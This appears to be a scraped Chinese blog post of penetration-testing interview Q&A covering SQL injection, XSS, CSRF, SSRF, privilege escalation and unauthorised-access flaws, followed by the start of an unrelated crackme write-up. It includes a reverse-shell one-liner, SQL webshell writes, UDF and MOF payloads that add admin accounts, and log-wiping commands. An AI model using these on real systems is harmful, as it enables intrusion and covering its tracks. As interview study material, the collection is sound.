中默认不⽀持，ASP 只是脚本语⾔⽽已。⼊侵的时候 asp 的⽊⻢⼀般是 guest 权限… APSX 的⽊⻢⼀般是 users 权限。 54、如何绕过 waf？⼤⼩写转换法 ⼲扰字符 /!/ 编码 base64 unicode hex url ascll 复参数 55、如何向服务器写⼊ webshell？各种上传漏洞 mysql具有写⼊权限,⽤sql语句写⼊shell http put⽅法 56、渗透测试中常⻅的端⼝a、web 类 (web 漏洞 / 敏感⽬录) 第三⽅通⽤组件漏洞 struts thinkphp jboss ganglia zabbix 80 web 80-89 web 8000-9090 web b、数据库类 (扫描弱⼝令)1433 MSSQL 1521 Oracle 3306 MySQL 5432 PostgreSQL c、特殊服务类 (未授权 / 命令执⾏类 / 漏洞) 443 SSL⼼脏滴⾎ 873 Rsync未授权 5984 CouchDB http://xxx:5984/_utils/ 6379 redis未授权 7001,7002 WebLogic默认弱⼝令，反序列 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 50000 SAP命令执⾏ 50070,50030 hadoop默认端⼝未授权访问 d、常⽤端⼝类 (扫描弱⼝令 / 端⼝爆破) 21 ftp 22 SSH 23 Telnet 2601,2604 zebra路由，默认密码zebra 3389 远程桌⾯ ALL、端⼝合计详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808121 ftp 22 SSH 23 Telnet 80 web 80-89 web 161 SNMP 389 LDAP 443 SSL⼼脏滴⾎以及⼀些web漏洞测试445 SMB 512,513,514 Rexec 873 Rsync未授权1025,111 NFS 1433 MSSQL 1521 Oracle:(iSqlPlus Port:5560,7778) 2082/2083 cpanel主机管理系统登陆 （国外⽤较多）2222 DA虚拟主机管理系统登陆 （国外⽤较多）2601,2604 zebra路由，默认密码zebra3128 squid代理默认端⼝，如果没设置⼝令很可能就直接漫游内⽹了3306 MySQL 3312/3311 kangle主机管理系统登陆3389 远程桌⾯4440 rundeck 参考WooYun: 借⽤新浪某服务成功漫游新浪内⽹5432 PostgreSQL 5900 vnc 5984 CouchDB http://xxx:5984/_utils/ 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致⽹站被直接篡改或者作为代理进⼊内⽹6379 redis未授权7001,7002 WebLogic默认弱⼝令，反序列7778 Kloxo主机控制⾯板登录8000-9090 都是⼀些常⻅的web端⼝，有些运维喜欢把管理后台开在这些⾮80的端⼝上8080 tomcat/WDCP主机管理系统，默认弱⼝令8080,8089,9090 JBOSS 8083 Vestacp主机管理系统 （国外⽤较多）8649 ganglia 8888 amh/LuManager 主机管理系统默认端⼝9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞10000 Virtualmin/Webmin 服务器虚拟主机管理系统11211 memcache未授权访问27017,27018 Mongodb未授权访问28017 mongodb统计⻚⾯50000 SAP命令执⾏50070,50030 hadoop默认端⼝未授权访问 三、深信服⼀⾯了解哪些漏洞⽂件上传有哪些防护⽅式 ⽤什么扫描端⼝，⽬录 如何判断注⼊ 注⼊有防护怎么办 有没有写过 tamper 3306 1443 8080 是什么端⼝ 计算机⽹络从物理层到应⽤层 xxxx 有没有 web 服务开发经验 如何向服务器写⼊ webshell 有没有⽤过 xss 平台 ⽹站渗透的流程 mysql 两种提权⽅式（udf，？） 常⻅加密⽅式 xxx ddos 如何防护 有没有抓过包，会不会写 wireshark 过滤规则 清理⽇志要清理哪些 四、SQL 注⼊防护1、使⽤安全的 API 2、对输⼊的特殊字符进⾏ Escape 转义处理 3、使⽤⽩名单来规范化输⼊验证⽅法 4、对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 5、服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 6、规范编码, 字符集 五、为什么参数化查询可以防⽌ SQL 注⼊原理:使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套 ⽤参数运⾏ 简单的说: 参数化能防注⼊的原因在于, 语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语 义跑 六、SQL 头注⼊点UA REFERER COOKIE IP 七、盲注是什么？怎么盲注？盲注是在 SQL 注⼊攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注 ⼊和利⽤的⽅式。盲注的⼿段有两种，⼀个是通过⻚⾯的返回内容是否正确 (boolean-based)，来验证是否存在注⼊。 ⼀个是通过 sql 语句处理时间的不同来判断是否存在注⼊ (time-based)，在这⾥，可以⽤ benchmark，sleep 等造成延 时效果的函数，也可以通过构造⼤笛卡⼉积的联合查询表来达到延时的⽬的。 ⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理在数据库使⽤了宽字符集⽽ WEB 中没考虑这个问题的情况下，在 WEB 层，由于 0XBF27 是两个字符，在 PHP 中⽐如 addslash 和 magic_quotes_gpc 开启时，由于会对 0x27 单引号进⾏转义，因此 0xbf27 会变成 0xbf5c27, ⽽数据进⼊ 数据库中时，由于 0XBF5C 是⼀个另外的字符，因此 \\ 转义符号会被前⾯的 bf 带着 “吃掉”，单引号由此逃逸出来可以 ⽤来闭合语句。 2、在哪⾥编码 3、根本原因 character_set_client(客户端的字符集) 和 character_set_connection(连接层的字符集) 不同, 或转换函数如，iconv、 mb_convert_encoding 使⽤不当。 4、解决办法 统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为 UTF-8。或对数据进⾏正确的转 义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。 5、SQL ⾥⾯只有 update 怎么利⽤ 先理解这句 SQL UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’$id’ 如果此 SQL 被修改成以下形式，就实现了注⼊ a、修改 homepage 值为 http://xxx.net', userlevel=’3 之后 SQL 语句变为UPDATE user SET password=’mypass’, homepage=’http://xxx.net', userlevel=’3’ WHERE id=’$id’ userlevel 为⽤户级别 b、修改 password 值为 mypass)’ WHERE username=’admin’# 之后 SQL 语句变为 UPDATE user SET password=’MD5(mypass)’ WHERE username=’admin’#)’, homepage=’$homepage’ WHERE id=’$id’ c、修改 id 值为 ‘ OR username=’admin’ 之后 SQL 语句变为 UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’’ OR username=’admin’ 九、SQL 如何写 shell / 单引被过滤怎么办写 shell: root 权限，GPC 关闭，知道⽂件路径 outfifile 函数 `http://127.0.0.1:81/sqli.php?id=1 into outfile ‘C:\\wamp64\\www\\phpinfo.php’ FIELDS TERMINATED BY ‘&lt;?php phpinfo (); ?&gt;’` `http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile ‘C:\\w amp64\\www\\phpinfo.php’` 宽字节注⼊ 1、代替空格的⽅法 %0a、%0b、%a0 等 /**/ 等注释符 &lt;&gt; 2、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别 5 0 以下没有 information schema 这个系统表 ⽆法列表名等 只能暴⼒跑表名。5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操做。 ⼗、XSS1、XSS 原理 反射型 ⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。需要诱使⽤户 “点击” ⼀个恶意链接，才能攻击 成功 存储型 存储型 XSS 会把⽤户输⼊的数据 “存储” 在服务器端。这种 XSS 具有很强的稳定性。 DOM 型 通过修改⻚⾯的 DOM 节点形成的 XSS，称之为 DOM Based XSS。 2、DOM 型和反射型的区别 反射型 XSS：通过诱导⽤户点击，我们构造好的恶意 payload 才会触发的 XSS。反射型 XSS 的检测我们在每次请求带 payload 的链接时⻚⾯应该是会带有特定的畸形数据的。DOM 型：通过修改⻚⾯的 DOM 节点形成的 XSS。DOM- based XSS 由于是通过 js 代码进⾏ dom 操作产⽣的 XSS，所以在请求的响应中我们甚⾄不⼀定会得到相应的畸形数 据。根本区别在我看来是输出点的不同。 3、DOM 型和 XSS ⾃动化测试或⼈⼯测试 ⼈⼯测试思路：找到类似 document.write、innerHTML 赋值、outterHTML 赋值、window.location 操作、写 javascript: 后内容、eval、setTimeout 、setInterval 等直接执⾏之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经 过安全函数。⾃动化测试参看道哥的博客，思路是从输⼊⼊⼿，观察变量传递的过程，最终检查是否有在危险函数输 出，中途是否有经过安全函数。但是这样就需要有⼀个 javascript 解析器，否则会漏掉⼀些通过 js 执⾏带⼊的部分内 容容。 在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进⾏检测，对不同 类型的 XSS 检测⽅式实际上并没有太过细分的标准化检测⽅式，所以回答的很烂。。。 4、如何快速发现 XSS 位置 5、对于 XSS 怎么修补建议 输⼊点检查：对⽤户输⼊的数据进⾏合法性检查，使⽤ fifilter 过滤敏感字符或对进⾏编码转义，针对特定类型数据进⾏格 式检查。针对输⼊点的检查最好放在服务器端实现。 输出点检查：对变量输出到 HTML ⻚⾯中时，对输出内容进⾏编码转义，输出在 HTML 中时，对其进⾏ HTMLEncode，如果输出在 Javascript 脚本中时，对其进⾏ JavascriptEncode。对使⽤ JavascriptEncode 的变量都放 在引号中并转义危险字符，data 部分就⽆法逃逸出引号外成为 code 的⼀部分。还可以使⽤更加严格的⽅法，对所有数 字字⺟之外的字符都使⽤⼗六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的 ⽅式也需要考虑清楚，针对不同的输出点，我们防御 XSS 的⽅法可能会不同，这点可能在之后的⽂章会做下总结。 除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。 6、XSS 蠕⾍的⽣产条件 正常情况下，⼀个是产⽣ XSS 点的⻚⾯不属于 self ⻚⾯，⽤户之间产⽣交互⾏为的⻚⾯，都可能造成 XSS Worm 的产 ⽣。 不⼀定需要存储型 XSS ⼗⼀、CSRF1、CSRF 原理 CSRF 是跨站请求伪造攻击，由客户端发起, 是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认 2、防御验证 Referer 添加 token 3、token 和 referer 做横向对⽐，谁安全等级⾼？ token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并 且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则) 4、对 referer 的验证，从什么⻆度去做？如果做，怎么杜绝问题 对 header 中的 referer 的验证，⼀个是空 referer，⼀个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的 ⽩名单中，正则规则应当写完善。 5、针对 token, 对 token 测试会注意哪⽅⾯被⼈，会对 token 的哪⽅⾯进⾏测试？ 引⽤⼀段请教前辈的回答： 针对token的攻击，⼀是对它本身的攻击，重放测试⼀次性、分析加密规则、校验⽅式是否正确等，⼆是结合信息泄露漏洞对它的获取，结合着发起组合攻击 信息泄露有可能是缓存、⽇志、get，也有可能是利⽤跨站 很多跳转登录的都依赖token，有⼀个跳转漏洞加反射型跨站就可以组合成登录劫持了 另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过⽐如抢红包业务之类的 ⼗二、SSRFSSRF(Server-Side Request Forgery: 服务器端请求伪造) 是⼀种由攻击者构造形成由服务端发起请求的⼀个安全漏洞。 ⼀般情况下，SSRF 攻击的⽬标是从外⽹⽆法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它 相连⽽与外⽹隔离的内部系统） SSRF 形成的原因⼤都是由于服务端提供了从其他服务器应⽤获取数据的功能且没有对⽬标地址做过滤与限制。⽐如从指 定 URL 地址获取⽹⻚⽂本内容，加载指定地址的图⽚，下载等等。 1、监测SSRF 漏洞的验证⽅法： 1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送 的，从⽽来判断是否存在 SSRF 漏洞 2）在⻚⾯源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存 在 SSRF 漏洞 2、SSRF 漏洞的成因 防御 绕过 成因：模拟服务器对其他服务器资源进⾏请求，没有做合法性验证。利⽤：构造恶意内⽹ IP 做探测，或者使⽤其余所⽀ 持的协议对其余服务进⾏攻击。防御：禁⽌跳转，限制协议，内外⽹限制，URL 限制。绕过：使⽤不同协议，针对 IP， IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转 + dns rebindding。 ⼗三、上传1、⽂件上传漏洞原理由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动 态脚本⽂件 2、常⻅的上传绕过⽅式前端 js 验证：禁⽤ js/burp 改包 ⼤⼩写 双重后缀名 过滤绕过 pphphp-&gt;php 3、防护⽂件上传⽬录设置为不可执⾏使⽤⽩名单判断⽂件上传类型 ⽤随机数改写⽂件名和路径 4、审查上传点的元素有什么意义？有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 ⼗四、⽂件包含1、原理引⼊⼀段⽤户能控制的脚本或代码，并让服务器端执⾏ include() 等函数通过动态变量的⽅式引⼊需要包含的⽂件； ⽤户能够控制该动态变量。 2、导致⽂件包含的函数PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), … JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), … ASP：include fifile, include virtual, 3、本地⽂件包含能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞 ⼗五、逻辑漏扫1、⾦融⾏业常⻅逻辑漏洞单针对⾦融业务的 主要是数据的篡改 (涉及⾦融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅⽺ ⽑，交易 / 订单信息泄露，⽔平越权对别⼈的账户查看或恶意操作，交易或业务步骤绕过。 ⼗五、中间⼈攻击中间 攻 （缺 ） 的攻 客户 与 务 之间在 的 中缺 造成的中间⼈攻击是⼀个（缺乏）相互认证的攻击；由于客户端与服务器之间在 SSL 握⼿的过程中缺乏相互认证⽽造成的漏洞 防御中间⼈攻击的⽅案通常基于⼀下⼏种技术 公钥基础建设 PKI 使⽤ PKI 相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例⼦中都是只验证服务 器，这样就造成了 SSL 握⼿环节的漏洞，⽽如果使⽤相互认证的的话，基本可以更强⼒的相互认证 延迟测试 使⽤复杂加密哈希函数进⾏计算以造成数⼗秒的延迟；如果双⽅通常情况下都要花费 20 秒来计算，并且整个通讯花费 了 60 秒计算才到达对⽅，这就能表明存在第三⽅中间⼈。 使⽤其他形式的密钥交换形式 ARP 欺骗原理 每台主机都有⼀个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，⽽局域⽹数据传输依靠的是 MAC 地址。在 ARP 缓存表机制存在⼀个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证⾃⼰是否向对⽅主机发送过 ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关 系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能 防护 在主机绑定⽹关 MAC 与 IP 地址为静态（默认为动态），命令：arp -s ⽹关 IP ⽹关 MAC 在⽹关绑定主机 MAC 与 IP 地址 使⽤ ARP 防⽕墙 ⼗六、DDOS1、DDOS 原理利⽤合理的请求造成资源过载，导致服务不可⽤ syn 洪流的原理伪造⼤量的源 IP 地址，分别向服务器端发送⼤量的 SYN 包，此时服务器端会返回 SYN/ACK 包，因为源地址是伪造 的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3～5 次并且等待⼀个 SYNTime（⼀般为 30 秒⾄ 2 分钟），如果超时则丢弃这个连接。攻击者⼤量发送这种伪造源地址的 SYN 请求，服务器端将会消耗⾮常多 的资源（CPU 和内存）来处理这种半连接，同时还要不断地对这些 IP 进⾏ SYN+ACK 重试。最后的结果是服务器⽆暇 理睬正常的连接请求，导致拒绝服务。 CC 攻击原理对⼀些消耗资源较⼤的应⽤⻚⾯不断发起正常的请求，以达到消耗服务端资源的⽬的。 2、DOSS 防护 SYN Cookie/SYN Proxy、safereset 等算法。SYN Cookie 的主要思想是为每⼀个 IP 地址分配⼀个 “Cookie”，并统计每 个 IP 地址的访问频率。如果在短时间内收到⼤量的来⾃同⼀个 IP 地址的数据包，则认为受到攻击，之后来⾃这个 IP 地 址的包将被丢弃。 ⼗七、提权MySQL 两种提权⽅式 udf 提权, mof 提权 MySQL_UDF 提取 要求: 1. ⽬标系统是 Windows(Win2000,XP,Win2003)；2. 拥有 MYSQL 的某个⽤户账号，此账号必须有对 mysql 的 insert 和 delete 权限以创建和抛弃函数 3. 有 root 账号密码 导出 udf: MYSQL 5.1 以上版本，必须要把 udf.dll ⽂件放到 安装⽬录 的 \\ ⽂件夹 才能创建⾃定义函数 以再 ⾥输⼊MYSQL 安装⽬录下的 lib\\plugin ⽂件夹下才能创建⾃定义函数 可以再 mysql ⾥输⼊ select @@basedir show variables like ‘%plugins%’ 寻找 mysql 安装路径 提权: 使⽤ SQL 语句创建功能函数。语法：Create Function 函数名（函数名只能为下⾯列表中的其中之⼀）returns string soname ‘导出的 DLL 路径’； create function cmdshell returns string soname ‘udf.dll’ select cmdshell(‘net user arsch arsch /add’); select cmdshell(‘net localgroup administrators arsch /add’); drop function cmdshell; 该⽬录默认是不存在的，这就需要我们使⽤ webshell 找到 MYSQL 的安装⽬录，并在安装⽬录下创建 lib\\plugin ⽂件 夹，然后将 udf.dll ⽂件导出到该⽬录即可。 MySQL mof 提权 1234567891011121314151617181920212223242526272829303132333435363738394041#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;)instance of __EventFilter as $EventFilter{EventNamespace = &quot;Root\\\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;};instance of ActiveScriptEventConsumer as $Consumer{Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user waitalone waitalone.cn /add\\&quot;)&quot;;};instance of __FilterToConsumerBinding{Consumer = $Consumer;Filter = $EventFilter;}; 其中的第 18 ⾏的命令，上传前请⾃⼰更改。 2、执⾏ load_fifile 及 into dumpfifile 把⽂件导出到正确的位置即可。 1select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov' 执⾏成功后，即可添加⼀个普通⽤户，然后你可以更改命令，再上传导出执⾏把⽤户提升到管理员权限，然后 3389 连 接之就 ok 了。 ⼗⼋、特殊漏洞1、Struts2-045 2、Redis 未授权 产⽣原因 Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公⽹上，如果在没有开启认证的情况下，可 以导致任意⽤户在可以访问⽬标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利⽤ Redis 的相关⽅法，可以成功在 Redis 服务器上写⼊公钥，进⽽可以使⽤对应私钥直接登录⽬标服务 器 利⽤条件和⽅法 条件: a、redis 服务以 root 账户运⾏ b、redis ⽆密码或弱密码进⾏认证c、redis 监听在 0.0.0.0 公⽹上 ⽅法: a、通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫 b、上传 SSH 公钥获得 SSH 登录权限 c、通过 crontab 反弹 shell d、slave 主从模式利⽤ 修复 密码验证 降权运⾏ 限制 ip / 修改端⼝ 3、Jenkins 未授权访问 4、MongoDB 未授权访问 攻击者通过未授权访问进⼊脚本命令执⾏界⾯执⾏攻击指令 println “ifconfig -a”.execute().text 执⾏⼀些系统命令, 利⽤ wget 下载 webshell 开启 MongoDB 服务时不添加任何参数时, 默认是没有权限验证的, ⽽且可以远程访问数据库，登录的⽤户可以通过默认 端⼝⽆需密码对数据库进⾏增、删、改、查等任意⾼危操作。 防护 为 MongoDB 添加认证：1)MongoDB 启动时添加–auth 参数 2) 给 MongoDB 添加⽤户：use admin #使⽤ admin 库 db.addUser(“root”, “123456”) #添加⽤户名 root 密码 123456 的⽤户 db.auth(“root”,“123456”) #验证下是否添加成 功，返回 1 说明成功 2、禁⽤ HTTP 和 REST 端⼝ MongoDB ⾃身带有⼀个 HTTP 服务和并⽀持 REST 接⼝。在 2.6 以后这些接⼝默认是关闭的。mongoDB 默认会使⽤默认端⼝监听 web 服务，⼀般不需要通过 web ⽅式进⾏远程管理，建议禁⽤。修改配置⽂件或在启动的时候选择–nohttpinterface 参数 nohttpinterface=false 3、限制绑定 IP 启动时加⼊ 参数 –bind_ip 127.0.0.1 或在 / etc/mongodb.conf ⽂件中添加以下内容：bind_ip = 127.0.0.1 5、Memcache 未授权访问 Memcached 是⼀套常⽤的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公⽹开放的 Memcache 服务很 容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。 利⽤ a、登录机器执⾏ netstat -an |more 命令查看端⼝监听情况。回显 0.0.0.0:11211 表示在所有⽹卡进⾏监听，存在 memcached 未授权访问漏洞。 b、telnet 11211，或 nc -vv 11211，提示连接成功表示漏洞存在 漏洞加固 a、设置 memchached 只允许本地访问 b、禁⽌外⽹访问 Memcached 11211 端⼝ c、编译时加上–enable-sasl，启⽤ SASL 认证 6、FFMPEG 本地⽂件读取 原理 通过调⽤加密 API 将 payload 加密放⼊⼀个会被执⾏的段字节中。但是具体回答⼯程中我只回答道了 SSRF ⽼洞， m3u8 头，偏移量，加密。 ⼗九、安全知识1、WEB 常⻅ WEB 开发 JAVA 框架 STRUTS,SPRING 常⻅的 java 框架漏洞 其实⾯试官问这个问题的时候我不太清楚他要问什么，我提到 struts 的 045048，java 常⻅反序列化。045 错误处理引⼊了 ognl 表达式 048 封装 action 的过程中有⼀步调⽤ getstackvalue 递归 获取 ognl 表达式 反序列化 操作对象，通过⼿段引⼊。apache common 的反射机制、readobject 的重写，其实具体的 我也记不清楚。。。然后这部分就结束了 同源策略 同源策略限制不同源对当前 document 的属性内容进⾏读取或设置。不同源的区分：协议、域名、⼦域名、IP、端⼝， 以上有不同时即不同源。 Jsonp 安全攻防技术，怎么写 Jsonp 的攻击⻚⾯ 涉及到 Jsonp 的安全攻防内容 JSON 劫持、Callback 可定义、JSONP 内容可定义、Content-type 不为 json。 攻击⻚⾯ JSON 劫持，跨域劫持敏感信息，⻚⾯类似于 function wooyun(v){ alert(v.username); } Content-type 不正确情况下，JSONP 和 Callback 内容可定义可造成 XSS。JSONP 和 FLASH 及其他的利⽤参照知道 创宇的 JSONP 安全攻防技术。 2、PHP php 中命令执⾏涉及到的函数 代码执⾏：eval()、assert()、popen()、system()、exec()、shell_exec()、 passthru(),pcntl_exec(),call_user_func_array(),create_function()⽂件读取：fifile_get_contents(),highlight_fifile(),fopen(),read fifile(),fread(),fgetss(), fgets(),parse_ini_fifile(),show_source(),fifile() 等 命令执⾏：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() 安全模式下绕过 php 的 disable fuction DL 函数，组件漏洞，环境变量。 PHP 弱类型 == 在进⾏⽐较的时候，会先将字符串类型转化成相同，再⽐较 如果⽐较⼀个数字和字符串或者⽐较涉及到数字内容的字符串，则字符串会被转换成数值并且⽐较按照数值来进⾏ 0e 开头的字符串等于 0 3、数据库 各种数据库⽂件存放的位置 mysql: /usr/local/mysql/data/ C:\\ProgramData\\MySQL\\MySQL Server 5.6\\Data\\ oracle: $ORACLE_BASE/oradata/$ORACLE_SID/ 4、系统 如何清理⽇志如何清理⽇志 meterpreter: clearev ⼊侵 Linux 服务器后需要清除哪些⽇志？ web ⽇志，如 apache 的 access.log,error.log。直接将⽇志清除过于明显, ⼀般使⽤ sed 进⾏定向清除 e.g. sed -i -e ‘/192.169.1.1/d’ history 命令的清除，也是对~/.bash_history 进⾏定向清除 wtmp ⽇志的清除，/var/log/wtmp 登录⽇志清除 /var/log/secure LINUX 查看当前端⼝连接的命令有哪些？netstat 和 ss 命令的区别和优缺点 netstat -antpss -l ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，⽽且⽐ netstat 更快速更⾼效。 反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么? bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1 通过 Linux 系统的 / proc ⽬录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？ ls /proc 系统信息，硬件信息，内核版本，加载的模块，进程 linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性。 /etc/ssh/sshd config iptables 配置/etc/ssh/sshd___config iptables 配置 如何⼀条命令查看⽂件内容最后⼀百⾏ tail -n 100 filename Windows 如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路。 5、密码学 AES／DES 的具体⼯作步骤 RSA 算法 加密: 密⽂＝明⽂ ^EmodN RSA 加密是对明⽂的 E 次⽅后除以 N 后求余数的过程 公钥＝(E,N) 解密: 明⽂＝密⽂ ^DmodN 私钥＝(D,N) 三个参数 n,e1,e2 n 是两个⼤质数 p,q 的积 分组密码的加密模式 如何⽣成⼀个安全的随机数？ 引⽤之前⼀个学⻓的答案，可以通过⼀些物理系统⽣成随机数，如电压的波动、磁盘磁头读 / 写时的寻道时间、空中电磁波的噪声等。 SSL 握⼿过程 建⽴ TCP 连接、客户端发送 SSL 请求、服务端处理 SSL 请求、客户端发送公共密钥加密过的随机数据、服务端⽤私有 密钥解密加密后的随机数据并协商暗号、服务端跟客户端利⽤暗号⽣成加密算法跟密钥 key、之后正常通信。这部分本 来是忘了的，但是之前看 SSL Pinning 的时候好像记了张图在脑⼦⾥，挣扎半天还是没敢确定，遂放弃。。。 对称加密与⾮对称加密的不同，分别⽤在哪些⽅⾯ 6、TCP/IP TCP 三次握⼿的过程以及对应的状态转换 （1）客户端向服务器端发送⼀个 SYN 包，包含客户端使⽤的端⼝号和初始序列号 x; （2）服务器端收到客户端发送来的 SYN 包后，向客户端发送⼀个 SYN 和 ACK 都置位的 TCP 报⽂，包含确认号 xx1 和服务器端的初始序列号 y; （3）客户端收到服务器端返回的 SYNSACK 报⽂后，向服务器端返回⼀个确认号为 yy1、序号为 xx1 的 ACK 报⽂，⼀ 个标准的 TCP 连接完成。 TCP 和 UDP 协议区别 tcp ⾯向连接, udp ⾯向报⽂ tcp 对系统资源的要求多 udp 结构简单 tcp 保证数据完整性和顺序，udp 不保证 https 的建⽴过程 a、客户端发送请求到服务器端 b、服务器端返回证书和公开密钥，公开密钥作为证书的⼀部分⽽存在 c、客户端验证证书和公开密钥的有效性，如果有效，则⽣成共享密钥并使⽤公开密钥加密发送到服务器端 d、服务器端使⽤私有密钥解密数据，并使⽤收到的共享密钥加密数据，发送到客户端 e、客户端使⽤共享密钥解密数据 f SSL 加密建⽴f、SSL 加密建⽴ 7、流量分析 wireshark 简单的过滤规则 过滤 ip: 过滤源 ip 地址: ip.src==1.1.1.1; , ⽬的 ip 地址: ip.dst==1.1.1.1; 过滤端⼝: 过滤 80 端⼝: tcp.port==80 , 源端⼝: tcp.srcport==80 , ⽬的端⼝: tcp.dstport==80 协议过滤: 直接输⼊协议名即可, 如 http 协议 http http 模式过滤: 过滤 get/post 包 http.request.mothod==”GET/POST” 8、防⽕墙 简述路由器交换机、防⽕墙等⽹络设备常⽤的⼏个基础配置加固项，以及配置⽅法。 转自： https://github.com/Mr-xn/BurpSuite-collections","link":"/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/"},{"title":"crackme-系列之-crackme4","text":"首先进行查壳 可以看到程序使用的Delphi编写的 没有加壳 导出符号既然是delphi编写的 那么我们首先把他放到IDA里，把所有的关于Delphi的签名全部加上 ida会自动帮我们识别所有的Delphi的函数，可以看到添加签名之后 未识别的函数就只有那么一点点，剩下的都是库函数。 然后导出为MAP文件，导入到OD里(LoadMapEx)，可以极大的减轻负担。 窗体分析两个编辑框 一个图片显示框，据说是注册之后会显示一个朱茵的图片。没有按钮，没有提示 利用Delphi的反编译工具Darkde4进行查看 打开窗体部分，原来之前一直误以为的图片显示框是一个大按钮，这个按钮有两个对应事件， 分别是单击事件和双击事件 这里是整个程序的所有的响应事件 以及对应的RVA 第一个FormCreate是窗体的创建事件 这个不必关心，一般创建事件都是显示图形界面相关的操作 第二个事件名是chkcode，全称应该是checkcode，校验代码，至于校验的是什么代码？不知道 第三个KeyUp是响应的键盘的弹起 第四个DbClick是按钮的双击事件 第五个Click是按钮的单击事件 那么思路和突破口也就有了，对应单击和双击事件的RVA 直接去OD分析两个响应事件的具体实现部分。 OD分析在单击事件的RVA 0x00457B8处下断点，随便输入一组用户名，从上往下分析所有的执行过程。 获取用户名 获取用户名长度 将长度加上0x1E 将长度转为字符串 字符串拼接 拼接为长度+用户名+循环次数 整个算法循环18次 最后的结果如上图 算法循环完了之后 比较[esi+0x30C]的值是否相等，如果不相等直接退出。如果相等，又是一轮重复的循环校验，接着提示注册成功。就是说前面的循环算法就是作者下的一个套，真正有用的部分就是这个比较，也就是[esi+0x30C] 的值必须是0x85。 结论 [esi+0x30C] 的值必须是0x85。 双击事件 